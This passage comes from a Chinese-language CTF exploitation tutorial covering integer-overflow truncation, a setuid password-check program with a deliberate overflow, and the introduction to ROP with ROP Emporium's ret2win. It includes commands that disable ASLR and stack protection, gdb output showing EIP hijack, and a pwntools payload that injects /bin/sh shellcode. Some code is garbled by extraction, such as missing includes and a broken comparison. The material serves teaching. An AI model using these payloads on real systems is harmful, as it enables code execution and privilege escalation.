型， len+5 可能发生溢出）
示例三，截断：
371
3.1.2 整数溢出
void main(int argc, char *argv[]) {
unsigned short int total;
total = strlen(argv[1]) + strlen(argv[2]) + 1;
char *buf = (char *)malloc(total);
strcpy(buf, argv[1]);
strcat(buf, argv[2]);
...
}
这个例子接受两个字符串类型的参数并计算它们的总长度，程序分配足够的内存来
存储拼接后的字符串。首先将第一个字符串参数复制到缓冲区中，然后将第二个参
数连接到尾部。如果攻击者提供的两个字符串总长度无法用 total 表示，则会发
生截断，从而导致后面的缓冲区溢出。
实战
看了上面的示例，我们来真正利用一个整数溢出漏洞。源码
372
3.1.2 整数溢出
#include
#include
void validate_passwd(char *passwd) {
char passwd_buf[11];
unsigned char passwd_len = strlen(passwd);
if(passwd_len >= 4 && passwd_len  /proc/sys/kernel/randomize_va_space
$ gcc -g -fno-stack-protector -z execstack vuln.c
$ sudo chown root vuln
$ sudo chgrp root vuln
$ sudo chmod +s vuln
使用 gdb 反汇编 validate_passwd 函数。
gdb-peda$ disassemble validate_passwd
Dump of assembler code for function validate_passwd:
373
3.1.2 整数溢出
0x0000059d : push ebp ;
压入 ebp
0x0000059e : mov ebp,esp
0x000005a0 : push ebx ;
压入 ebx
0x000005a1 : sub esp,0x14
0x000005a4 : call 0x4a0 
0x000005a9 : add ebx,0x1a57
0x000005af : sub esp,0xc
0x000005b2 : push DWORD PTR [ebp+0x8]
0x000005b5 : call 0x430 
0x000005ba : add esp,0x10
0x000005bd : mov BYTE PTR [ebp-0x9],al ;
将 len 存入 [ebp-0x9]
0x000005c0 : cmp BYTE PTR [ebp-0x9],0x3
0x000005c4 : jbe 0x5f2 
0x000005c6 : cmp BYTE PTR [ebp-0x9],0x8
0x000005ca : ja 0x5f2 
0x000005cc : sub esp,0xc
0x000005cf : lea eax,[ebx-0x1910]
0x000005d5 : push eax
0x000005d6 : call 0x420 
0x000005db : add esp,0x10
0x000005de : sub esp,0x8
0x000005e1 : push DWORD PTR [ebp+0x8]
0x000005e4 : lea eax,[ebp-0x14] ;
取 passwd_buf 地址
0x000005e7 : push eax ;
压入 passwd_buf
0x000005e8 : call 0x410 
0x000005ed : add esp,0x10
0x000005f0 : jmp 0x604 
0x000005f2 : sub esp,0xc
0x000005f5 : lea eax,[ebx-0x190a]
0x000005fb : push eax
0x000005fc : call 0x420 
0x00000601 : add esp,0x10
0x00000604 : nop
0x00000605 : mov ebx,DWORD PTR [ebp-0x4]
0x00000608 : leave
374
3.1.2 整数溢出
0x00000609 : ret
End of assembler dump.
通过阅读反汇编代码，我们知道缓冲区 passwd_buf 位于 ebp=0x14 的位置
（ 0x000005e4 : lea eax,[ebp-0x14] ），而返回地址在 ebp+4 的位
置，所以返回地址相对于缓冲区 0x18 的位置。我们测试一下：
375
3.1.2 整数溢出
gdb-peda$ r `python2 -c 'print "A"*24 + "B"*4 + "C"*233'`
Starting program: /home/a.out `python2 -c 'print "A"*24 + "B"*4
+ "C"*233'`
good!
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd0f4 ('A' , "BBBB", 'C' ...)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd490 --> 0x534c0043 ('C')
EDX: 0xffffd1f8 --> 0xffff0043 --> 0x0
ESI: 0xf7f95000 --> 0x1bbd90
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd110 ('C' ...)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT di
rection overflow)
[-------------------------------------code----------------------
---------------]
Invalid $PC address: 0x42424242
[------------------------------------stack----------------------
---------------]
0000| 0xffffd110 ('C' ...)
0004| 0xffffd114 ('C' ...)
0008| 0xffffd118 ('C' ...)
0012| 0xffffd11c ('C' ...)
0016| 0xffffd120 ('C' ...)
0020| 0xffffd124 ('C' ...)
0024| 0xffffd128 ('C' ...)
0028| 0xffffd12c ('C' ...)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
376
3.1.2 整数溢出
可以看到 EIP 被 BBBB 覆盖，相当于我们获得了返回地址的控制权。构建下面
的 payload：
from pwn import *
ret_addr = 0xffffd118 # ebp = 0xffffd108
shellcode = shellcraft.i386.sh()
payload = "A" * 24
payload += p32(ret_addr)
payload += "\x90" * 20
payload += asm(shellcode)
payload += "C" * 169 # 24 + 4 + 20 + 44 + 169 = 261
CTF 中的整数溢出
377
3.1.3 栈溢出
3.1.3 栈溢出
378
3.1.4 返回导向编程（ROP）（x86）
3.1.4 返回导向编程（ROP）
ROP 简介
寻找 gadgets
常用的 gadgets
ROP Emporium
ret2win32
ret2win
split32
split
callme32
callme
write432
write4
badchars32
badchars
fluff32
fluff
pivot32
pivot
更多资料
ROP 简介
返回导向编程（Return-Oriented Programming，缩写：ROP）是一种高级的内存
攻击技术，该技术允许攻击者在现代操作系统的各种通用防御下执行代码，如内存
不可执行和代码签名等。这类攻击往往利用操作堆栈调用时的程序漏洞，通常是缓
冲区溢出。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序
列（gadgets），每一段 gadget 通常以 return 指令（ ret ，机器码为 c3 ）结
束，并位于共享库代码中的子程序中。通过执行这些指令序列，也就控制了程序的
执行。
379
3.1.4 返回导向编程（ROP）（x86）
ret 指令相当于 pop eip 。即，首先将 esp 指向的 4 字节内容读取并赋值给
eip ，然后 esp 加上 4 字节指向栈的下一个位置。如果当前执行的指令序列仍
然以 ret 指令结束，则这个过程将重复， esp 再次增加并且执行下一个指令
序列。
寻找 gadgets
1. 在程序中寻找所有的 c3（ret） 字节
2. 向前搜索，看前面的字节是否包含一个有效指令，这里可以指定最大搜索字节
数，以获得不同长度的 gadgets
3. 记录下我们找到的所有有效指令序列
理论上我们是可以这样寻找 gadgets 的，但实际上有很多工具可以完成这个工作，
如 ROPgadget，Ropper 等。更完整的搜索可以使用 http://ropshell.com/。
常用的 gadgets
对于 gadgets 能做的事情，基本上只要你敢想，它就敢执行。下面简单介绍几种用
法：
保存栈数据到寄存器
将栈顶的数据抛出并保存到寄存器中，然后跳转到新的栈顶地址。所以当
返回地址被一个 gadgets 的地址覆盖，程序将在返回后执行该指令序列。
如： pop eax; ret
保存内存数据到寄存器
将内存地址处的数据加载到内存器中。
如： mov ecx,[eax]; ret
保存寄存器数据到内存
将寄存器的值保存到内存地址处。
如： mov [eax],ecx; ret
算数和逻辑运算
add, sub, mul, xor 等。
如： add eax,ebx; ret , xor edx,edx; ret
系统调用
执行内核中断
如： int 0x80; ret , call gs:[0x10]; ret
会影响栈帧的 gadgets
380
3.1.4 返回导向编程（ROP）（x86）
这些 gadgets 会改变 ebp 的值，从而影响栈帧，在一些操作如 stack pivot
时我们需要这样的指令来转移栈帧。
如： leave; ret , pop ebp; ret
ROP Emporium
ROP Emporium 提供了一系列用于学习 ROP 的挑战，每一个挑战都介绍了一个知
识，难度也逐渐增加，是循序渐进学习 ROP 的好资料。ROP Emporium 还有个特
点是它专注于 ROP，所有挑战都有相同的漏洞点，不同的只是 ROP 链构造的不
同，所以不涉及其他的漏洞利用和逆向的内容。每个挑战都包含了 32 位和 64 位的
程序，通过对比能帮助我们理解 ROP 链在不同体系结构下的差异，例如参数的传
递等。这篇文章我们就从这些挑战中来学习吧。
这些挑战都包含一个 flag.txt 的文件，我们的目标就是通过控制程序执行，来
打印出文件中的内容。当然你也可以尝试获得 shell。
下载文件
ret2win32
通常情况下，对于一个有缓冲区溢出的程序，我们通常先输入一定数量的字符填满
缓冲区，然后是精心构造的 ROP 链，通过覆盖堆栈上保存的返回地址来实现函数
跳转（关于缓冲区溢出请查看上一章 3.1.3栈溢出）。
第一个挑战我会尽量详细一点，因为所有挑战程序都有相似的结构，缓冲区大小都
一样，我们看一下漏洞函数：
gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
0x080485f6 : push ebp
0x080485f7 : mov ebp,esp
0x080485f9 : sub esp,0x28
0x080485fc : sub esp,0x4
0x080485ff : push 0x20
0x08048601 : push 0x0
0x08048603 : lea eax,[ebp-0x28]
0x08048606 : push eax
0x08048607 : call 0x8048460 
381
3.1.4 返回导向编程（ROP）（x86）
0x0804860c : add esp,0x10
0x0804860f : sub esp,0xc
0x08048612 : push 0x804873c
0x08048617 : call 0x8048420 
0x0804861c : add esp,0x10
0x0804861f : sub esp,0xc
0x08048622 : push 0x80487bc
0x08048627 : call 0x8048420 
0x0804862c : add esp,0x10
0x0804862f : sub esp,0xc
0x08048632 : push 0x8048821
0x08048637 : call 0x8048400 
0x0804863c : add esp,0x10
0x0804863f : mov eax,ds:0x804a060
0x08048644 : sub esp,0x4
0x08048647 : push eax
0x08048648 : push 0x32
0x0804864a : lea eax,[ebp-0x28]
0x0804864d : push eax
0x0804864e : call 0x8048410 
0x08048653 : add esp,0x10
0x08048656 : nop
0x08048657 : leave
0x08048658 : ret
End of assembler dump.
gdb-peda$ disassemble ret2win
Dump of assembler code for function ret2win:
0x08048659 : push ebp
0x0804865a : mov ebp,esp
0x0804865c : sub esp,0x8
0x0804865f : sub esp,0xc
0x08048662 : push 0x8048824
0x08048667 : call 0x8048400 
0x0804866c : add esp,0x10
0x0804866f : sub esp,0xc
0x08048672 : push 0x8048841
0x08048677 : call 0x8048430 